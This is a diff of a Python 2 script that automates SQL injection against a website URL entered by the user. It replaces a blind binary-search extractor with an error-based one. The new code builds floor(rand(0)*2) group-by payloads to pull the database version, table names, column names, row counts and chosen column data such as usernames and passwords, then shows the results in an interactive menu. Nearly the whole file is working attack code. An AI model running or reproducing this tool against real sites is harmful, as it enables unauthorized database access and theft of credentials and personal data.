@@ -1,23 +1,17 @@
 import requests
 import sys
-import time
+from time import sleep
+from prettytable import PrettyTable
 
 page_length_success = 0
 page_length_failure = 0
-
-# table names expected to exist. You can add more to the list if you find other table names
-table_names = ['admin', 'users', 'admins', 'administrators', 'login', 'user']
-
-# column_names expected to exist. You can add more to the list if you find other column names
-column_names = ['uname', 'username', 'usrname', 'usernames', 'admin', 'admins', 'administrator', 'administrators', 'id',
-				'pass', 'password', 'passwrd', 'passwd', 'custname', 'customer_name', 'customername', 'cust_name',
-				'c_name', 'cname', 'login', 'login_name', 'loginname', 'lname', 'l_name']
 
 exploit_dict = {}
 exploit_tables = {}
 exploit_columnNames = {}
 exploit_recordsCount = {}
 exploit_recordsName = {}
+tempObj = {}
 '''
 validate_vulnerable(url) takes the absolute path of url as input and validates
 if the url is vulnerable. It also differentiates between success and failure 
@@ -49,94 +43,21 @@ def validate_vulnerable(url):
 		print "URL is not vulnerable"
 		return None
 
-
-def execute_query(query):
-	check = len(requests.get(query).text)
-	if check == page_length_success:
-		return True
-	else:
-		return False
-
-
-def binSearch(query, low, high):
-	l = low
-	h = high
-	mid = 0
-	while True:
-		mid = (l + h) / 2
-		if execute_query(query + "=" + str(mid)):
-			break
-		elif execute_query(query + ">" + str(mid)):
-			l = mid + 1
-		elif execute_query(query + "<" + str(mid)):
-			h = mid
-		else:
-			print "End of Rows"
-			sys.exit(0)
-
-	return mid
-
-
-def version_of_query(query):
-	i = 1
-	result = []
-	while True:
-		val = binSearch(query + " and ascii(substring(@@version," + str(i) + ",1))", 0, 127)
-		i += 1
-		if chr(val) != '\x00':
-			result.append(chr(val))
-		else:
-			break
-	print "".join(result)
-
-
-def get_table_names(query):
-	# t = []
-	for i in table_names:
-		res = len(requests.get(query + " and (select 1 from " + i + " limit 0,1)=1").text)
-		if res == page_length_success:
-			return i
-
-
-def get_column_names(query, tname):
-	c = []
-	for i in column_names:
-		res = len(requests.get(
-			query + " and (select substring(concat(1," + i + "),1,1) from " + tname + " limit 0,1)=1").text)
-		if res == page_length_success:
-			c.append(i)
-	return c
-
-
-def get_data(url, tname, cnames):
-	cols = ",0x3a,".join(cnames)
-	i, j = 1, 1
-	res = []
-	result = []
-	print ':'.join(cnames)
-	while True:
-		val = binSearch(
-			url + " and ascii(substring((SELECT concat(" + cols + ") from " + tname + " limit " + str(j) + ",1)," + str(
-				i) + ",1))", 0, 127)
-		i += 1
-		if chr(val) != '\x00':
-			res.append(chr(val))
-
-		else:
-			i = 1
-			j += 1
-			result.append(''.join(res))
-			print ''.join(res)
-
-		if j == 2:
-			break
-	print result
-
 def splitascii(hexVal):
-	tempHex = hexVal.split("'~1'")[0].split("'~'")[1]
-	if "'" in tempHex:
-		tempHex = tempHex.split("'")[0]
-	return tempHex
+	if "'~1'" in hexVal:
+		tempHex = hexVal.split("'~1'")[0].split("'~'")[1]
+		if "'" in tempHex:
+			tempHex = tempHex.split("'")[0]
+		return tempHex
+	return '00'
+
+def getVersion(url):
+	exploitQuery = " and(select 1 from(select count(*),concat((select (select " \
+				"concat(0x7e,0x27,Hex(cast(version() " \
+				"as char)),0x27,0x7e)) from information_schema.tables" \
+				" limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
+	res = requests.get(url + exploitQuery).text
+	print "Version is: " + splitascii(res).decode('hex')
 
 def getDatabase(url):
 	exploitQuery = " and(select 1 from(select count(*),concat((select " \
@@ -165,123 +86,166 @@ def gettablenames(url):
 	tempVal = exploit_dict.get('dbNameAscii')
 	exploit_dict['tableNames'] = []
 	exploit_dict['tableNameAscii'] = []
-	for i in range(1,tempCount):
+	print "Fetching Table Names..."
+	for i in range(0,tempCount):
 		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
 				   "concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema.tables " \
 				   "Where table_schema=0x"+tempVal+" limit "+str(i)+",1)) from information_schema.tables " \
 				   "limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
-		# print exploitQuery
 		res = requests.get(url + exploitQuery).text
 		exploit_dict['tableNameAscii'].append(str(splitascii(res)))
 		exploitVal = splitascii(res).decode('hex')
 		exploit_dict['tableNames'].append(exploitVal)
-	# print "Table Names in DB:\n"+'\n'.join(exploit_dict['tableNames'])
 
-def getcolumncount(url):
+def getcolumncount(url,tname):
 	tempDBName = exploit_dict.get('dbNameAscii')
 	tempTableNamesHex = exploit_dict.get('tableNameAscii')
 	tempTableNames = exploit_dict.get('tableNames')
 	tablesLen = len(tempTableNames)
-	for i in range(0,tablesLen):
-		temp = {}
-		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
-					   "count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE " \
-					   "table_schema=0x"+ tempDBName +" AND table_name=0x"+ tempTableNamesHex[i] +")) " \
-					   "from information_schema.tables limit 0,1),floor(rand(0)*2))x " \
-					   "from information_schema.tables group by x)a) and 1=1"
-		res = requests.get(url + exploitQuery).text
-		exploitVal = splitascii(res)
-		temp['count'] = int(exploitVal)
-		exploit_tables[tempTableNamesHex[i].decode('hex')] = temp
-		# print tempTableNames[i] + " : " + exploitVal
+	print "Fetching number of columns for table: " + tname
+	temp = {}
+	exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
+				   "count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE " \
+				   "table_schema=0x"+ tempDBName +" AND table_name=0x"+ tname.encode('hex') +")) " \
+				   "from information_schema.tables limit 0,1),floor(rand(0)*2))x " \
+				   "from information_schema.tables group by x)a) and 1=1"
+	res = requests.get(url + exploitQuery).text
+	exploitVal = splitascii(res)
+	temp['count'] = int(exploitVal)
+	exploit_tables[tname] = temp
 
-def getcolumnnames(url):
+def getcolumnnames(url,tname):
 	tempDBNameHex = exploit_dict.get('dbNameAscii')
 	tempTableNamesHex = exploit_dict.get('tableNameAscii')
 	tempTableNames = exploit_dict.get('tableNames')
-	tablesLen = len(tempTableNames)
-	# tableOneLen = exploit_tables[tempTableNames[1]].get('count')
-	for i in range(0, tablesLen):
-		tempArr = []
-		tablecolumnCount = exploit_tables[tempTableNames[i]].get('count')
-		for j in range(0,tablecolumnCount):
-			executeQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
-						   "concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema.columns " \
-						   "Where table_schema=0x"+tempDBNameHex+" AND table_name=0x"+tempTableNamesHex[i]+" limit "+str(j)+",1))" \
-						   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
-			res = requests.get(url + executeQuery).text
-			exploitVal = splitascii(res)
-			# print exploitVal
-			tempArr.append(exploitVal.decode('hex'))
-			exploit_columnNames[tempTableNamesHex[i].decode('hex')] = tempArr
-
-def getrecordscount(url):
-	tempDBName = exploit_dict.get('dbName')
-	tempTableNamesHex = exploit_dict.get('tableNameAscii')
-	tempTableNames = exploit_dict.get('tableNames')
-	tablesLen = len(tempTableNames)
-
-	for i in range(0,len(tempTableNames)):
-		tempObj = {}
-		exploitQuery  = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) " \
-						"FROM `"+ tempDBName +"`."+tempTableNames[i]+")) from information_schema.tables limit 0,1)," \
-						"floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
-		res = requests.get(url + exploitQuery).text
+	print "Fetching column names for table: " + tname
+	tempArr = []
+	tablecolumnCount = exploit_tables[tname].get('count')
+	for j in range(0,tablecolumnCount):
+		executeQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
+					   "concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema.columns " \
+					   "Where table_schema=0x"+tempDBNameHex+" AND table_name=0x"+ tname.encode('hex') +" limit "+str(j)+",1))" \
+					   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
+		res = requests.get(url + executeQuery).text
 		exploitVal = splitascii(res)
-		# print exploitVal
-		tempObj["recCount"] = int(exploitVal)
-		exploit_recordsCount[tempTableNames[i]] = tempObj
+		tempArr.append(exploitVal.decode('hex'))
+		exploit_columnNames[tname] = tempArr
 
-def getrecordnames(url):
+def getrowcount(url,tname):
 	tempDBName = exploit_dict.get('dbName')
 	tempTableNamesHex = exploit_dict.get('tableNameAscii')
-	tempTableNames = exploit_dict.get('tableNames')
-	tablesLen = len(tempTableNames)
+	print "Fetching number of rows in table: " + tname
+	tempObj = {}
+	exploitQuery  = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) " \
+					"FROM `"+ tempDBName +"`."+tname+")) from information_schema.tables limit 0,1)," \
+					"floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
+	res = requests.get(url + exploitQuery).text
+	exploitVal = splitascii(res)
+	tempObj["recCount"] = int(exploitVal)
+	exploit_recordsCount[tname] = tempObj
 
-	for i in range(0,len(tempTableNames)):
-		tempObj = {}
-		tempArr = []
-		tempRecordCount = exploit_recordsCount[tempTableNames[i]].get('recCount')
-		tempColumnName = exploit_columnNames[tempTableNames[i]][1]
-		for j in range(0, tempRecordCount):
-			exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
-						   "Hex(cast("+tempTableNames[i]+"."+tempColumnName+" as char)),0x27,0x7e) FROM `"+ tempDBName +"`."+tempTableNames[i]+" LIMIT "+str(j)+",1))" \
-						   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
 
-			res = requests.get(url+exploitQuery).text
-			# print res
-			exploitVal = splitascii(res)
-			# print exploitVal
+def getrows(url,tname,cname,n):
+	tempDBName = exploit_dict.get('dbName')
+	print "Fetching rows in column: " + cname
+	tempArr = []
+	for j in range(0, n):
+		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
+					   "Hex(cast("+tname+"."+cname+" as char)),0x27,0x7e) FROM `"+ tempDBName +"`."+tname+" LIMIT "+str(j)+",1))" \
+					   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
+
+		res = requests.get(url+exploitQuery).text
+		exploitVal = splitascii(res)
+		if exploitVal.decode('hex') == '\x00':
+			tempArr.append('null')
+		else:
 			tempArr.append(exploitVal.decode('hex'))
-		tempObj[tempColumnName] = tempArr
-		exploit_recordsName[tempTableNames[i]] = tempObj
+	tempObj[cname] = tempArr
+	exploit_recordsName[tname] = tempObj
 
 if __name__ == "__main__":
 	web_url = raw_input("Enter website with absolute url:\n")
 	status_code = validate_vulnerable(web_url)
 	if status_code == None:
 		sys.exit(0)
-	else:
-		# version_of_query(web_url)
-		# tables = get_table_names(web_url)
-		# columns = get_column_names(web_url,tables)
-		# get_data(web_url,tables,columns)
-		getDatabase(web_url)
-		gettablescount(web_url)
-		gettablenames(web_url)
-		getcolumncount(web_url)
-		getcolumnnames(web_url)
-		getrecordscount(web_url)
-		getrecordnames(web_url)
-		# print exploit_dict
-		# print exploit_tables
-		print exploit_columnNames
-		print exploit_recordsCount
-		print exploit_recordsName
-		'''
-		print "Tables"
-		print tables
-		print "Table_columns"
-		for i in columns:
-			print i
-		'''
+
+	getVersion(web_url)
+	getDatabase(web_url)
+	gettablescount(web_url)
+	gettablenames(web_url)
+	tables_loaded = []
+	columns_loaded = {}
+	while True:
+		cols_temp = []
+		print "Tables in this Database:"
+		table_s = PrettyTable()
+		table_s.add_column("Table_Names",exploit_dict['tableNames'])
+
+		print table_s
+
+		t_name = raw_input("Enter table name to read data from: ").lower()
+		if t_name not in exploit_dict['tableNames']:
+			print "Not a valid table"
+			sys.exit(0)
+		
+		if t_name not in tables_loaded:	
+			getcolumncount(web_url,t_name)
+			getcolumnnames(web_url,t_name)
+			getrowcount(web_url,t_name)
+			tables_loaded.append(t_name)
+		
+		if t_name not in columns_loaded:
+				columns_loaded[t_name] = cols_temp
+		else:
+			cols_temp = columns_loaded[t_name]
+		
+		row_count = exploit_recordsCount[t_name].get('recCount')
+
+		print "Columns in table " + t_name			
+		column_s = PrettyTable()
+		column_s.add_column("Column(s)",exploit_columnNames[t_name])
+		print column_s
+
+		cols = raw_input("Enter columns you want separated with ':' like 'col1:col2:col3' - ").lower()
+			
+
+		cnms = cols.split(':')
+
+		for i in cnms:
+			if i not in exploit_columnNames[t_name]:
+				print "Column " + i + " are not in table: " + t_name
+				sys.exit(0)
+
+		number_of_rows = int(raw_input("Enter number of rows you want to see: "))
+			
+		if number_of_rows > row_count:
+			print ">>>Warning: Table " + t_name + " has only " + str(row_count) + " row(s)."
+			number_of_rows = row_count
+			
+		print "Data in table: " + t_name
+			
+		for i in cnms:
+			if i not in columns_loaded[t_name]:
+				getrows(web_url,t_name,i,number_of_rows)			
+				cols_temp.append(i)
+		
+		columns_loaded[t_name] = cols_temp
+		
+		lol = exploit_recordsName[t_name]
+
+		output = PrettyTable()
+			
+		for key,val in sorted(lol.iteritems()):
+			output.add_column(key,sorted(val))
+				
+		print output
+		choice = None	
+		tempObj = {}	
+
+		while choice != 'yes' and choice != 'no':		
+			choice = raw_input(">>>Do you want to extract data from different table(s) or column(s): yes or no -->").lower()
+			if choice != 'yes' and choice != 'no':
+				print ">>>Please enter yes or no"
+		
+		if choice == 'no':
+			sys.exit(0)
